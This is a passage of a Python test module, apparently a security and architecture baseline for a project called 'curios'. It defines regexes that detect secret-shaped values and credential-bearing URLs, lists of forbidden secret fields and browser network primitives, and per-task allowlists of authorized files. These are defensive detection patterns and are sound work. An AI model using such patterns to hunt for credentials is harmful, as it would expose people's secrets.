from __future__ import annotations

import ast
import json
import re
import subprocess
import textwrap
import tomllib
from dataclasses import fields
from pathlib import Path
from typing import Any, cast, get_type_hints

import pytest
import yaml
from contract_fixtures import UTC_LATER, UTC_NOW, fixed_id, human_principal
from curios_contracts import (
    APPROVAL_OUTCOME_VALUES,
    CONFIGURATION_PROFILE_VALUES,
    EFFECT_CLASSIFICATION_VALUES,
    GOVERNED_EFFECT_VALUES,
    POLICY_DECISION_OUTCOME_VALUES,
    RISK_CLASSIFICATION_VALUES,
    Approval,
    ApprovalOutcome,
    ArtifactId,
    Authority,
    ConfigurationProfile,
    ConfigurationProfileName,
    EffectClassification,
    EventId,
    EvidenceId,
    ExecutionId,
    ObjectReference,
    ObservabilityContext,
    Permission,
    PolicyDecision,
    PolicyDecisionOutcome,
    Principal,
    PrincipalType,
    ProjectId,
    ProviderId,
    SecretReference,
    WorkId,
    to_json_compatible,
)
from curios_core import CoreContext, CoreServices
from yaml.constructor import ConstructorError
from yaml.events import AliasEvent
from yaml.nodes import MappingNode

REPO_ROOT = Path(__file__).resolve().parents[2]
CONTRACTS_SOURCE = REPO_ROOT / "packages/python/curios_contracts/src/curios_contracts"
CORE_SOURCE = REPO_ROOT / "packages/python/curios_core/src/curios_core"
RUNTIME_SOURCE = REPO_ROOT / "packages/python/curios_runtime/src/curios_runtime"
API_SOURCE = REPO_ROOT / "apps/api/src/curios_api"
WEB_SOURCE = REPO_ROOT / "apps/web/src"
QUALITY_GATES_WORKFLOW = REPO_ROOT / ".github/workflows/quality-gates.yml"
LOCAL_DOCKER_ENV_EXAMPLE = REPO_ROOT / "infrastructure/local/docker/.env.example"
ROOT_PACKAGE_FILES = (
    REPO_ROOT / "package.json",
    REPO_ROOT / "pnpm-workspace.yaml",
    REPO_ROOT / "pyproject.toml",
)

SECURITY_FAILURE = "SECURITY_FAILURE"

SECRET_SHAPED_VALUE_RE = re.compile(
    r"(?i)(api[_-]?key|authorization|client[_-]?secret|credential|password|private[_-]?key|secret|token|access[_-]?token)\s*[:=]"
)
SENSITIVE_ASSIGNMENT_RE = re.compile(
    r"""(?ix)
    (?P<key>
        [A-Za-z0-9_.-]*
        (?:api[_-]?key|authorization|client[_-]?secret|credential|password|private[_-]?key|secret|token|access[_-]?token)
        [A-Za-z0-9_.-]*
    )
    \s*[:=]\s*
    (?P<quote>['"]?)
    (?P<value>[^\s'"#]+)
    (?P=quote)
    """
)
CREDENTIAL_URL_RE = re.compile(r"://[^/\s:@]+(?::[^/\s@]*)?@")
SECRET_FIELD_TOKEN_RE = re.compile(
    r"(?i)(api[_-]?key|authorization|client[_-]?secret|credential|password|private[_-]?key|secret|session|token|access[_-]?token|cookie)"
)
ACTION_FULL_SHA_REF_RE = re.compile(r"^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+@[0-9a-f]{40}$")
PROHIBITED_SECRET_VALUE_FIELDS = frozenset(
    {
        "access_token",
        "api_key",
        "authorization",
        "client_secret",
        "cookie",
        "credential",
        "credentials",
        "oauth_token",
        "password",
        "private_key",
        "secret",
        "secret_key",
        "secret_value",
        "session",
        "token",
    }
)
SECURITY_IMPLEMENTATION_IMPORTS = frozenset(
    {
        "alembic",
        "boto3",
        "docker",
        "fastapi",
        "hvac",
        "keyring",
        "ollama",
        "opentelemetry",
        "pydantic",
        "psycopg",
        "requests",
        "sqlalchemy",
        "starlette",
    }
)
CORE_SECURITY_RUNTIME_NAMES = frozenset(
    {
        "AuthorityGrant",
        "CredentialStore",
        "IamService",
        "PolicyEngine",
        "PolicyEvaluator",
        "SecretResolver",
    }
)
CORE_FORBIDDEN_SECURITY_METHOD_PARTS = frozenset(
    {
        "authorize",
        "evaluate_policy",
        "grant_authority",
        "resolve_secret",
        "revoke_authority",
    }
)
LATER_TASK_PATHS = (
    "services",
    "providers",
    "packages/python/curios_postgres",
    "packages/python/curios_telemetry",
)
M0_PLANNED_PACKAGE_ROOTS_BY_TASK = {
    "TASK-M0-002": frozenset({"packages/python/curios_persistence"}),
    "TASK-M0-003": frozenset({"packages/python/curios_policy"}),
    "TASK-M0-004": frozenset({"packages/python/curios_runtime"}),
    "TASK-M0-005": frozenset({"packages/python/curios_runtime"}),
    "TASK-M0-006": frozenset({"packages/python/curios_runtime"}),
    "TASK-M0-007": frozenset({"packages/python/curios_runtime"}),
}
M0_AUTHORIZED_PACKAGE_ROOTS_BY_TASK = {
    "TASK-M0-002": frozenset({"packages/python/curios_persistence"}),
    "TASK-M0-003": frozenset({"packages/python/curios_policy"}),
    "TASK-M0-004": frozenset({"packages/python/curios_runtime"}),
    "TASK-M0-005": frozenset({"packages/python/curios_runtime"}),
    "TASK-M0-006": frozenset({"packages/python/curios_runtime"}),
    "TASK-M0-007": frozenset({"packages/python/curios_runtime"}),
}
M0_AUTHORIZED_RUNTIME_SOURCE_FILES_BY_TASK = {
    "TASK-M0-004": frozenset({"event_evidence_store.py"}),
    "TASK-M0-005": frozenset({"work_repository.py"}),
    "TASK-M0-006": frozenset({"single_step_runtime.py"}),
    "TASK-M0-007": frozenset({"provider_inventory_executor.py"}),
}
M1_AUTHORIZED_RUNTIME_SOURCE_FILES_BY_TASK = {
    "TASK-M1-006": frozenset({"agent_repository.py"}),
    "TASK-M1-007": frozenset({"agent_lifecycle_repository.py"}),
    "TASK-M1-008": frozenset({"executor_seam.py"}),
}
M0_AUTHORIZED_RUNTIME_SOURCE_FILES = frozenset(
    {
        "__init__.py",
        "py.typed",
        *frozenset().union(*M0_AUTHORIZED_RUNTIME_SOURCE_FILES_BY_TASK.values()),
        *frozenset().union(*M1_AUTHORIZED_RUNTIME_SOURCE_FILES_BY_TASK.values()),
    }
)
M0_PLANNED_APP_ROOTS_BY_TASK = {
    "TASK-M0-008": frozenset({"apps/api"}),
    "TASK-M0-009": frozenset({"apps/web"}),
}
M0_AUTHORIZED_API_SOURCE_FILES_BY_TASK = {
    "TASK-M0-008": frozenset({"composition.py", "service.py"}),
}
M0_AUTHORIZED_API_TEST_FILES_BY_TASK = {
    "TASK-M0-008": frozenset({"test_fastapi_service_composition.py", "test_m0_work_endpoints.py"}),
}
M0_AUTHORIZED_API_SOURCE_FILES = frozenset(
    {
        "__init__.py",
        "py.typed",
        *frozenset().union(*M0_AUTHORIZED_API_SOURCE_FILES_BY_TASK.values()),
    }
)
M0_AUTHORIZED_API_TEST_FILES = frozenset().union(*M0_AUTHORIZED_API_TEST_FILES_BY_TASK.values())
M0_AUTHORIZED_WEB_SOURCE_FILES_BY_TASK = {
    "TASK-M0-009": frozenset(
        {
            "App.css",
            "App.test.tsx",
            "App.tsx",
            "apiBoundary.ts",
            "main.tsx",
        }
    ),
}
M0_AUTHORIZED_WEB_SOURCE_FILES = frozenset().union(*M0_AUTHORIZED_WEB_SOURCE_FILES_BY_TASK.values())
FROZEN_FASTAPI_APPLICATION_ROUTES = (
    (
        "/health/live",
        ("GET",),
        "health_live",
        "curios_api.service",
        "create_application.<locals>.health_live",
        True,
    ),
    (
        "/health/ready",
        ("GET",),
        "health_ready",
        "curios_api.service",
        "create_application.<locals>.health_ready",
        True,
    ),
    (
        "/providers",
        ("GET",),
        "providers",
        "curios_api.service",
        "create_application.<locals>.providers",
        True,
    ),
    (
        "/work/provider-inventory",
        ("POST",),
        "create_provider_inventory_work",
        "curios_api.service",
        "create_application.<locals>.create_provider_inventory_work",
        True,
    ),
    (
        "/work/{work_id}",
        ("GET",),
        "get_work",
        "curios_api.service",
        "create_application.<locals>.get_work",
        True,
    ),
    (
        "/work/{work_id}/run",
        ("POST",),
        "run_work_once",
        "curios_api.service",
        "create_application.<locals>.run_work_once",
        True,
    ),
    (
        "/work/{work_id}/executions/{execution_id}",
        ("GET",),
        "get_execution",
        "curios_api.service",
        "create_application.<locals>.get_execution",
        True,
    ),
    (
        "/work/{work_id}/events",
        ("GET",),
        "list_work_events",
        "curios_api.service",
        "create_application.<locals>.list_work_events",
        True,
    ),
    (
        "/work/{work_id}/evidence",
        ("GET",),
        "list_work_evidence",
        "curios_api.service",
        "create_application.<locals>.list_work_evidence",
        True,
    ),
)
FROZEN_FASTAPI_FRAMEWORK_ROUTES = (
    ("/openapi.json", ("GET", "HEAD"), "openapi", False),
    ("/docs", ("GET", "HEAD"), "swagger_ui_html", False),
    ("/docs/oauth2-redirect", ("GET", "HEAD"), "swagger_ui_redirect", False),
    ("/redoc", ("GET", "HEAD"), "redoc_html", False),
)
FROZEN_WEB_API_BOUNDARY_PATHS = (
    "/health/live",
    "/health/ready",
    "/providers",
    "/work/provider-inventory",
    "/work/{work_id}",
    "/work/{work_id}/run",
    "/work/{work_id}/executions/{execution_id}",
    "/work/{work_id}/events",
    "/work/{work_id}/evidence",
)
FROZEN_WEB_API_BOUNDARY_PATH_LITERALS = (
    "/health/live",
    "/health/ready",
    "/providers",
    "/work/provider-inventory",
    "/work/{work_id}",
    "/work/{work_id}/run",
    "/work/{work_id}/executions/{execution_id}",
    "/work/{work_id}/events",
    "/work/{work_id}/evidence",
    "/",
    "/work/${encodeURIComponent(workId)}",
    "/work/${encodeURIComponent(workId)}/run",
    "/work/${encodeURIComponent(workId)}/executions/${encodeURIComponent(\n    executionId,\n  )}",
    "/work/${encodeURIComponent(workId)}/events",
    "/work/${encodeURIComponent(workId)}/evidence",
    "/work/provider-inventory",
)
FROZEN_WEB_API_BOUNDARY_METHODS = ("POST", "POST")
FROZEN_WEB_API_BOUNDARY_REQUESTS = (
    ("createProviderInventoryWork", '"/work/provider-inventory"', "POST"),
    ("runProviderInventoryWork", "runWorkPath(workId)", "POST"),
    ("readWork", "workPath(workId)", "GET"),
    ("readExecution", "executionPath(workId, executionId)", "GET"),
    ("listWorkEvents", "eventsPath(workId)", "GET"),
    ("listWorkEvidence", "evidencePath(workId)", "GET"),
)
FROZEN_WEB_API_BOUNDARY_EXPORTS = (
    "apiBoundaryPaths",
    "ApiBoundaryPath",
    "WorkState",
    "ExecutionState",
    "RuntimeStatus",
    "WorkItemPayload",
    "ExecutionPayload",
    "RuntimeEventPayload",
    "EvidencePayload",
    "ObjectReferencePayload",
    "ProviderDescriptorPayload",
    "ProviderInventoryValue",
    "ResultPayload",
    "WorkResponse",
    "ExecutionResponse",
    "WorkRunResponse",
    "EventsResponse",
    "EvidenceResponse",
    "ApiErrorDetail",
    "ApiFailure",
    "ApiResult",
    "apiBoundaryUrl",
    "workPath",
    "runWorkPath",
    "executionPath",
    "eventsPath",
    "evidencePath",
    "createProviderInventoryWork",
    "runProviderInventoryWork",
    "readWork",
    "readExecution",
    "listWorkEvents",
    "listWorkEvidence",
)
FROZEN_WEB_APP_IMPORTS = (
    (
        "@curiosos/curios-contracts",
        (
            ("curiosContractsPackageName", None, False),
            ("curiosContractsPackageVersion", None, False),
        ),
    ),
    (
        "react",
        (
            ("useRef", None, False),
            ("useState", None, False),
            ("JSX", None, True),
            ("ReactNode", None, True),
        ),
    ),
    ("./App.css", ()),
    (
        "./apiBoundary",
        (
            ("apiBoundaryPaths", None, False),
            ("createProviderInventoryWork", None, False),
            ("listWorkEvidence", None, False),
            ("listWorkEvents", None, False),
            ("readExecution", None, False),
            ("readWork", None, False),
            ("runProviderInventoryWork", None, False),
            ("ApiFailure", None, True),
            ("EvidencePayload", None, True),
            ("ExecutionPayload", None, True),
            ("ProviderDescriptorPayload", None, True),
            ("RuntimeEventPayload", None, True),
            ("RuntimeStatus", None, True),
            ("WorkItemPayload", None, True),
        ),
    ),
)
FROZEN_WEB_APP_IMPORT_MODULES = tuple(module for module, _ in FROZEN_WEB_APP_IMPORTS)
FROZEN_WEB_APP_AUTHORITY_IMPORTS_BY_MODULE = {
    module: names
    for module, names in FROZEN_WEB_APP_IMPORTS
    if module in {"@curiosos/curios-contracts", "./apiBoundary"}
}
FROZEN_WEB_APP_EXPORTS = ("App",)
FROZEN_WEB_APP_INTERACTIVE_CAPABILITIES = (
    ("button", "onClick", ("createProviderInventoryWork",)),
    ("button", "onClick", ("runProviderInventoryWork",)),
    ("button", "onClick", ("listWorkEvents", "listWorkEvidence", "readExecution", "readWork")),
)
WEB_APP_FORBIDDEN_CAPABILITY_IDENTIFIERS = frozenset(
    {
        "EventSource",
        "fetch",
        "globalThis",
        "navigator",
        "sendBeacon",
        "WebSocket",
        "window",
        "XMLHttpRequest",
    }
)
WEB_API_BOUNDARY_FORBIDDEN_NETWORK_IDENTIFIERS = frozenset(
    {
        "EventSource",
        "globalThis",
        "navigator",
        "sendBeacon",
        "WebSocket",
        "window",
        "XMLHttpRequest",
    }
)
WEB_NETWORK_PRIMITIVES = (
    "XMLHttpRequest",
    "WebSocket",
    "EventSource",
    "navigator.sendBeacon",
)
FUTURE_WEB_BACKEND_PATH_TOKENS = (
    "/agent",
    "/agents",
    "/chat",
    "/cognitive",
    "/completion",
    "/dag",
    "/datalab",
    "/inference",
    "/memory",
    "/model",
    "/routing",
    "/scheduler",
)
FROZEN_CORE_DECLARATIONS_BY_MODULE = {
    "__init__.py": (),
    "application.py": (("CoreServices", "class"),),
    "context.py": (("CoreContext", "class"),),
    "ports/__init__.py": (),
    "ports/providers.py": (
        ("ProviderDescriptorsResult", "type_alias"),
        ("ProviderCatalog", "class"),
    ),
}
FROZEN_CORE_CLASS_MEMBERS_BY_MODULE = {
    "application.py": {
        "CoreServices": (
            ("provider_catalog", "annotation"),
            ("list_provider_descriptors", "method"),
        )
    },
    "context.py": {"CoreContext": (("observability", "annotation"), ("authority", "annotation"))},
    "ports/providers.py": {"ProviderCatalog": (("list_provider_descriptors", "method"),)},
}
FROZEN_RUNTIME_DECLARATIONS_BY_MODULE = {
    "__init__.py": (),
    "agent_lifecycle_repository.py": (
        ("AGENT_INSTANCE_TRANSITIONS", "annotation"),
        ("AGENT_LIFECYCLE_EVENT_TYPE", "assignment"),
        ("AgentLifecycleErrorCode", "class"),
        ("AgentLifecycleError", "class"),
        ("StoredAgentLifecycleTransition", "class"),
        ("M1AgentLifecycleRepository", "class"),
        ("transition_agent_instance", "function"),
        ("agent_lifecycle_event", "function"),
    ),
    "agent_repository.py": (
        ("AgentRepositoryErrorCode", "class"),
        ("AgentRepositoryError", "class"),
        ("StoredAgentDefinition", "class"),
        ("StoredAgentInstance", "class"),
        ("M1AgentRepository", "class"),
    ),
    "executor_seam.py": (
        ("M1_EXECUTOR_EVENT_TYPE", "assignment"),
        ("ExecutorOutcomeStatus", "class"),
        ("ExecutorErrorCode", "class"),
        ("ExecutorRequest", "class"),
        ("ExecutorOutcome", "class"),
        ("M1Executor", "class"),
        ("DeterministicM1Executor", "class"),
    ),
    "event_evidence_store.py": (
        ("RuntimeStoreErrorCode", "class"),
        ("RuntimeStoreError", "class"),
        ("EventEvidenceRuntimeStore", "class"),
    ),
    "provider_inventory_executor.py": (("ProviderInventoryExecutor", "class"),),
    "single_step_runtime.py": (
        ("SingleStepRuntimeErrorCode", "class"),
        ("SingleStepRuntimeStatus", "class"),
        ("SingleStepRuntimeError", "class"),
        ("SingleStepRuntimeRequest", "class"),
        ("SingleStepExecutionRequest", "class"),
        ("SingleStepExecutionOutcome", "class"),
        ("SingleStepExecutor", "class"),
        ("SingleStepRuntimeResult", "class"),
        ("SingleStepRuntimeService", "class"),
    ),
    "work_repository.py": (
        ("WORK_ITEM_TRANSITIONS", "annotation"),
        ("EXECUTION_TRANSITIONS", "annotation"),
        ("RepositoryErrorCode", "class"),
        ("RepositoryError", "class"),
        ("StoredWorkItem", "class"),
        ("StoredExecutionRecord", "class"),
        ("M0WorkRepository", "class"),
        ("transition_work_item", "function"),
        ("transition_execution_record", "function"),
    ),
}
FROZEN_RUNTIME_CLASS_MEMBERS_BY_MODULE = {
    "agent_lifecycle_repository.py": {
        "AgentLifecycleErrorCode": (
            ("CONFLICT", "assignment"),
            ("CORRUPT_RECORD", "assignment"),
            ("ILLEGAL_TRANSITION", "assignment"),
            ("NOT_FOUND", "assignment"),
            ("PERSISTENCE_FAILURE", "assignment"),
        ),
        "AgentLifecycleError": (("to_json_compatible", "method"),),
        "StoredAgentLifecycleTransition": (
            ("instance", "annotation"),
            ("version", "annotation"),
            ("event", "annotation"),
            ("changed", "annotation"),
        ),
        "M1AgentLifecycleRepository": (("transition_instance", "method"),),
    },
    "agent_repository.py": {
        "AgentRepositoryErrorCode": (
            ("CONFLICT", "assignment"),
            ("CORRUPT_RECORD", "assignment"),
            ("NOT_FOUND", "assignment"),
            ("PERSISTENCE_FAILURE", "assignment"),
        ),
        "AgentRepositoryError": (("to_json_compatible", "method"),),
        "StoredAgentDefinition": (("definition", "annotation"), ("version", "annotation")),
        "StoredAgentInstance": (("instance", "annotation"), ("version", "annotation")),
        "M1AgentRepository": (
            ("create_definition", "method"),
            ("read_definition", "method"),
            ("list_definitions", "method"),
            ("create_instance", "method"),
            ("read_instance", "method"),
            ("list_instances", "method"),
        ),
    },
    "executor_seam.py": {
        "ExecutorOutcomeStatus": (
            ("COMPLETED", "assignment"),
            ("FAILED", "assignment"),
            ("BLOCKED", "assignment"),
        ),
        "ExecutorErrorCode": (
            ("AGENT_DEFINITION_MISMATCH", "assignment"),
            ("AGENT_NOT_ACTIVE", "assignment"),
            ("AGENT_WORK_MISMATCH", "assignment"),
            ("CAPABILITY_AMBIGUOUS", "assignment"),
            ("CAPABILITY_MISSING", "assignment"),
            ("CAPABILITY_SHAPE_INVALID", "assignment"),
            ("EXECUTOR_FAILURE", "assignment"),
            ("MISSING_AGENT_INSTANCE", "assignment"),
            ("UNSUPPORTED_WORK_TYPE", "assignment"),
            ("WORK_NOT_READY", "assignment"),
        ),
        "ExecutorRequest": (
            ("work", "annotation"),
            ("dag_readiness", "annotation"),
            ("capability_resolutions", "annotation"),
            ("agent_instance", "annotation"),
            ("producer_ref", "annotation"),
            ("event_id", "annotation"),
            ("evidence_id", "annotation"),
            ("occurred_at", "annotation"),
            ("observability_context", "annotation"),
        ),
        "ExecutorOutcome": (
            ("status", "annotation"),
            ("result", "annotation"),
            ("event", "annotation"),
            ("evidence_refs", "annotation"),
            ("to_json_compatible", "method"),
        ),
        "M1Executor": (("execute", "method"),),
        "DeterministicM1Executor": (("execute", "method"),),
    },
    "event_evidence_store.py": {
        "RuntimeStoreErrorCode": (
            ("CONFLICT", "assignment"),
            ("CORRUPT_RECORD", "assignment"),
            ("NOT_FOUND", "assignment"),
            ("PERSISTENCE_FAILURE", "assignment"),
        ),
        "RuntimeStoreError": (("to_json_compatible", "method"),),
        "EventEvidenceRuntimeStore": (
            ("persistence_store", "annotation"),
            ("append_event", "method"),
            ("get_event", "method"),
            ("require_event", "method"),
            ("list_events", "method"),
            ("append_evidence", "method"),
            ("get_evidence", "method"),
            ("require_evidence", "method"),
            ("list_evidence", "method"),
            ("append_verification", "method"),
            ("get_verification", "method"),
            ("require_verification", "method"),
            ("list_verifications", "method"),
        ),
    },
    "provider_inventory_executor.py": {
        "ProviderInventoryExecutor": (
            ("provider_catalogs", "annotation"),
            ("execute", "method"),
        )
    },
    "single_step_runtime.py": {
        "SingleStepRuntimeErrorCode": (
            ("CONFLICT", "assignment"),
            ("EXECUTOR_FAILURE", "assignment"),
            ("ILLEGAL_STATE", "assignment"),
            ("INVALID_EXECUTOR_RESULT", "assignment"),
            ("NOT_FOUND", "assignment"),
            ("POLICY_FAILURE", "assignment"),
            ("POLICY_NOT_AUTHORIZED", "assignment"),
            ("REPOSITORY_FAILURE", "assignment"),
            ("RUNTIME_STORE_FAILURE", "assignment"),
        ),
        "SingleStepRuntimeStatus": (
            ("COMPLETED", "assignment"),
            ("FAILED", "assignment"),
            ("BLOCKED", "assignment"),
        ),
        "SingleStepRuntimeError": (("to_json_compatible", "method"),),
        "SingleStepRuntimeRequest": (
            ("work_id", "annotation"),
            ("principal", "annotation"),
            ("producer_ref", "annotation"),
            ("executor_ref", "annotation"),
            ("scope", "annotation"),
            ("resource_refs", "annotation"),
            ("requested_effects", "annotation"),
            ("policy_state_known", "annotation"),
            ("observability_context", "annotation"),
            ("occurred_at", "annotation"),
            ("execution_id", "annotation"),
        ),
        "SingleStepExecutionRequest": (
            ("work", "annotation"),
            ("execution", "annotation"),
            ("policy_decision", "annotation"),
            ("observability_context", "annotation"),
        ),
        "SingleStepExecutionOutcome": (
            ("result", "annotation"),
            ("evidence_refs", "annotation"),
        ),
        "SingleStepExecutor": (("execute", "method"),),
        "SingleStepRuntimeResult": (
            ("status", "annotation"),
            ("work", "annotation"),
            ("policy_decision", "annotation"),
            ("execution", "annotation"),
            ("executor_result", "annotation"),
            ("events", "annotation"),
            ("evidence_refs", "annotation"),
            ("recording_errors", "annotation"),
        ),
        "SingleStepRuntimeService": (
            ("work_repository", "annotation"),
            ("event_store", "annotation"),
            ("policy_evaluator", "annotation"),
            ("executor", "annotation"),
            ("run_once", "method"),
        ),
    },
    "work_repository.py": {
        "RepositoryErrorCode": (
            ("CONFLICT", "assignment"),
            ("ILLEGAL_TRANSITION", "assignment"),
            ("NOT_FOUND", "assignment"),
            ("PERSISTENCE_FAILURE", "assignment"),
        ),
        "RepositoryError": (("to_json_compatible", "method"),),
        "StoredWorkItem": (("item", "annotation"), ("version", "annotation")),
        "StoredExecutionRecord": (("record", "annotation"), ("version", "annotation")),
        "M0WorkRepository": (
            ("create_work", "method"),
            ("read_work", "method"),
            ("transition_work", "method"),
            ("create_execution", "method"),
            ("read_execution", "method"),
            ("transition_execution", "method"),
        ),
    },
}
M0_PLANNED_TEST_ROOTS_BY_TASK = {
    "TASK-M0-010": frozenset({"tests/integration"}),
    "TASK-M0-012": frozenset({"tests/acceptance"}),
}
M1_PLANNED_SURFACES_BY_TASK = {
    "TASK-M1-002": frozenset(
        {
            "packages/python/curios_contracts",
            "packages/typescript/curios-contracts",
        }
    ),
    "TASK-M1-003": frozenset({"M1 cognitive implementation module"}),
    "TASK-M1-004": frozenset({"M1 DAG runtime/persistence modules"}),
    "TASK-M1-005": frozenset({"M1 capability resolver module"}),
    "TASK-M1-006": frozenset({"M1 agent persistence modules"}),
    "TASK-M1-007": frozenset({"M1 agent lifecycle modules"}),
    "TASK-M1-008": frozenset({"M1 executor seam modules"}),
    "TASK-M1-009": frozenset({"M1 model/profile discovery module"}),
    "TASK-M1-010": frozenset({"M1 routing decision modules"}),
    "TASK-M1-011": frozenset({"M1 bounded DAG runner modules"}),
    "TASK-M1-012": frozenset({"M1 verification loop modules"}),
    "TASK-M1-013": frozenset({"apps/api"}),
    "TASK-M1-014": frozenset({"apps/web"}),
    "TASK-M1-015": frozenset({"tests/integration"}),
    "TASK-M1-016": frozenset({".github/workflows/quality-gates.yml"}),
    "TASK-M1-017": frozenset({"tests/acceptance"}),
}
M1_CURRENTLY_AUTHORIZED_SURFACES_BY_TASK = {
    "TASK-M1-001": frozenset(
        {
            "docs/architecture/TASK-M1-001-topology-guardrails.md",
            "docs/program/status-ledger/M1-status-ledger.md",
            "docs/security/TASK-M1-001-topology-guardrails.md",
            "docs/tasks/TASK-M1-001-evidence.md",
            "docs/tasks/TASK-M1-001-validation-evidence.md",
            "tests/architecture/test_architecture_conformance.py",
            "tests/security/test_security_baseline.py",
        }
    ),
    "TASK-M1-002": frozenset(
        {
            "docs/contracts/TASK-M1-002-cognitive-contracts.md",
            "docs/program/status-ledger/M1-status-ledger.md",
            "docs/tasks/TASK-M1-002-evidence.md",
            "docs/tasks/TASK-M1-002-validation-evidence.md",
            "packages/python/curios_contracts/src/curios_contracts/__init__.py",
            "packages/python/curios_contracts/src/curios_contracts/cognitive.py",
            "packages/python/curios_contracts/src/curios_contracts/identifiers.py",
            "packages/python/curios_contracts/src/curios_contracts/references.py",
            "packages/python/curios_contracts/tests/test_task_m1_002_cognitive_contracts.py",
            "tests/contract/test_cross_contract_boundaries.py",
            "tests/schema/test_contract_serialization.py",
            "tests/security/test_security_baseline.py",
        }
    ),
    "TASK-M1-003": frozenset(
        {
            "docs/program/status-ledger/M1-status-ledger.md",
            "docs/tasks/TASK-M1-003-evidence.md",
            "docs/tasks/TASK-M1-003-validation-evidence.md",
            "packages/python/curios_cognitive",
            "pyproject.toml",
            "tests/architecture/test_architecture_conformance.py",
            "tests/security/test_security_baseline.py",
        }
    ),
    "TASK-M1-004": frozenset(
        {
            "docs/program/status-ledger/M1-status-ledger.md",
            "docs/tasks/TASK-M1-004-evidence.md",
            "packages/python/curios_dag",
            "packages/python/curios_persistence",
            "pyproject.toml",
            "tests/architecture/test_architecture_conformance.py",
            "tests/security/test_security_baseline.py",
        }
    ),
    "TASK-M1-005": frozenset(
        {
            "docs/program/status-ledger/M1-status-ledger.md",
            "docs/tasks/TASK-M1-005-evidence.md",
            "packages/python/curios_capability",
            "pyproject.toml",
            "tests/architecture/test_architecture_conformance.py",
            "tests/security/test_security_baseline.py",
        }
    ),
    "TASK-M1-006": frozenset(
        {
            "docs/program/status-ledger/M1-status-ledger.md",
            "docs/tasks/TASK-M1-006-evidence.md",
            "packages/python/curios_persistence",
            "packages/python/curios_runtime",
            "tests/security/test_security_baseline.py",
        }
    ),
    "TASK-M1-007": frozenset(
        {
            "docs/program/status-ledger/M1-status-ledger.md",
            "docs/tasks/TASK-M1-007-evidence.md",
            "docs/tasks/TASK-M1-007-validation-evidence.md",
            "packages/python/curios_runtime",
            "tests/security/test_security_baseline.py",
        }
    ),
    "TASK-M1-008": frozenset(
        {
            "docs/program/status-ledger/M1-status-ledger.md",
            "docs/tasks/TASK-M1-008-evidence.md",
            "packages/python/curios_runtime",
            "tests/security/test_security_baseline.py",
        }
    ),
}
M1_PLANNED_SURFACE_TASKS = frozenset(M1_PLANNED_SURFACES_BY_TASK)
M1_CURRENTLY_AUTHORIZED_SURFACE_TASKS = frozenset(M1_CURRENTLY_AUTHORIZED_SURFACES_BY_TASK)
M0_DEFERRED_PACKAGE_ROOTS = frozenset().union(*M0_PLANNED_PACKAGE_ROOTS_BY_TASK.values())
M0_AUTHORIZED_PACKAGE_ROOTS = frozenset().union(*M0_AUTHORIZED_PACKAGE_ROOTS_BY_TASK.values())
M0_DEFERRED_PACKAGE_ROOTS = M0_DEFERRED_PACKAGE_ROOTS - M0_AUTHORIZED_PACKAGE_ROOTS
M0_DEFERRED_TOP_LEVEL_ROOTS = frozenset({"runtime", "services", "providers"})
M1_PLANNED_BUT_UNAUTHORIZED_PACKAGE_ROOTS = frozenset(
    {
        "packages/python/curios_agents",
        "packages/python/curios_executor",
        "packages/python/curios_model_profiles",
        "packages/python/curios_routing",
        "packages/python/curios_verification_loop",
    }
)
M1_PLUS_EXAMPLE_PACKAGE_ROOTS = frozenset(
    {
        "packages/python/curios_agent_runtime",
        "packages/python/curios_datalab",
        "packages/python/curios_knowledge",
        "packages/python/curios_model_router",
        "packages/python/curios_secret_resolver",
    }
)
AUTHORIZED_BOOT019_INTEGRATION_TESTS = frozenset(
    {
        "tests/integration/test_api_integration.py",
        "tests/integration/test_postgres_provider_integration.py",
    }
)
AUTHORIZED_M0_INTEGRATION_TESTS_BY_TASK = {
    "TASK-M0-010": frozenset(
        {
            "tests/integration/test_m0_vertical_slice_integration.py",
        }
    ),
}
AUTHORIZED_M0_INTEGRATION_TESTS = frozenset().union(
    *AUTHORIZED_M0_INTEGRATION_TESTS_BY_TASK.values()
)
AUTHORIZED_BOOT026_ACCEPTANCE_TESTS = frozenset(
    {
        "tests/acceptance/test_boot_acceptance.py",
    }
)
AUTHORIZED_M0_ACCEPTANCE_TESTS_BY_TASK = {
    "TASK-M0-012": frozenset(
        {
            "tests/acceptance/test_m0_acceptance.py",
        }
    ),
}
AUTHORIZED_M0_ACCEPTANCE_TESTS = frozenset().union(*AUTHORIZED_M0_ACCEPTANCE_TESTS_BY_TASK.values())
AUTHORIZED_GITHUB_PATHS = frozenset(
    {
        ".github/workflows/quality-gates.yml",
    }
)
AUTHORIZED_WORKFLOW_PERMISSIONS = {"contents": "read"}
AUTHORIZED_WORKFLOW_TRIGGERS = {
    "push": {"branches": ["**"]},
    "pull_request": "",
}
ALLOWED_CONTRACTS_SOURCE_FILES = frozenset(
    {
        "__init__.py",
        "_validation.py",
        "agents.py",
        "artifacts.py",
        "capabilities.py",
        "cognitive.py",
        "errors.py",
        "events.py",
        "evidence.py",
        "executions.py",
        "identifiers.py",
        "lifecycle.py",
        "observability.py",
        "providers.py",
        "py.typed",
        "references.py",
        "results.py",
        "schema_version.py",
        "security.py",
        "serialization.py",
        "temporal.py",
        "verification.py",
        "work.py",
    }
)
ALLOWED_TYPESCRIPT_CONTRACTS_SOURCE_FILES = frozenset({"index.ts"})
FROZEN_CONTRACT_DECLARATIONS_BY_MODULE = {
    "_validation.py": (
        ("validate_safe_token", "function"),
        ("validate_safe_text", "function"),
        ("validate_media_type", "function"),
        ("reject_secret_shaped_text", "function"),
        ("normalize_details", "function"),
    ),
    "agents.py": (
        ("AgentInstanceState", "class"),
        ("AgentDefinition", "class"),
        ("AgentInstance", "class"),
        ("AGENT_INSTANCE_STATE_VALUES", "annotation"),
    ),
    "artifacts.py": (
        ("ArtifactKind", "class"),
        ("IntegrityAlgorithm", "class"),
        ("IntegrityDescriptor", "class"),
        ("ArtifactReference", "class"),
        ("ARTIFACT_KIND_VALUES", "annotation"),
        ("INTEGRITY_ALGORITHM_VALUES", "annotation"),
    ),
    "capabilities.py": (
        ("CapabilityCategory", "class"),
        ("CapabilityQuality", "class"),
        ("Capability", "class"),
        ("CapabilityRequirement", "class"),
        ("CAPABILITY_CATEGORY_VALUES", "annotation"),
        ("CAPABILITY_QUALITY_VALUES", "annotation"),
    ),
    "cognitive.py": (
        ("Intent", "class"),
        ("Problem", "class"),
        ("Assumption", "class"),
        ("Decision", "class"),
        ("Plan", "class"),
    ),
    "errors.py": (
        ("ErrorCode", "class"),
        ("ErrorCategory", "class"),
        ("ErrorSeverity", "class"),
        ("ContractError", "class"),
